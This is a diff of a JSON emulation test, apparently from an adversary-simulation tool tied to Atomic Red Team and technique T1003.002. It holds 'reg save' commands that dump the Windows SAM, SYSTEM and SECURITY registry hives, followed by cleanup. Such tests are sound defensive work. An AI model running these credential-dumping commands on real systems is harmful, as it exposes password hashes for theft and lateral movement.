@@ -7,38 +7,38 @@
   ],
   "steps": [
     {
-      "id": "32f6bf6c-cc98-486e-aaf2-dfc3e16fed1b",
+      "id": "bbef4ae4-e09d-4feb-8ba3-0fb4d589f5e2",
       "type": "execute-command",
       "data": {
         "command": "reg save HKLM\\sam %temp%\\sam\nreg save HKLM\\system %temp%\\system\nreg save HKLM\\security %temp%\\security\n",
         "command_type": "command_prompt"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "ee23f845-813b-45dd-a208-c53b3f20f1f7",
+      "id": "0b24c52e-5256-49c9-96ae-9d06549aef35",
       "type": "execute-command",
       "data": {
         "command": "del %temp%\\sam \u003enul 2\u003e nul\ndel %temp%\\system \u003enul 2\u003e nul\ndel %temp%\\security \u003enul 2\u003e nul\n",
         "command_type": "command_prompt"
       },
-      "elevation_required": false
+      "elevation_required": true
     }
   ],
   "flows": [
     {
-      "s": "32f6bf6c-cc98-486e-aaf2-dfc3e16fed1b",
+      "s": "bbef4ae4-e09d-4feb-8ba3-0fb4d589f5e2",
       "p": "on-success",
-      "o": "ee23f845-813b-45dd-a208-c53b3f20f1f7"
+      "o": "0b24c52e-5256-49c9-96ae-9d06549aef35"
     },
     {
-      "s": "32f6bf6c-cc98-486e-aaf2-dfc3e16fed1b",
+      "s": "bbef4ae4-e09d-4feb-8ba3-0fb4d589f5e2",
       "p": "on-failure",
-      "o": "ee23f845-813b-45dd-a208-c53b3f20f1f7"
+      "o": "0b24c52e-5256-49c9-96ae-9d06549aef35"
     }
   ],
   "tags": [
-    "T1003.002",
-    "atomic-red-team"
+    "T1003",
+    "T1003.002"
   ]
 }
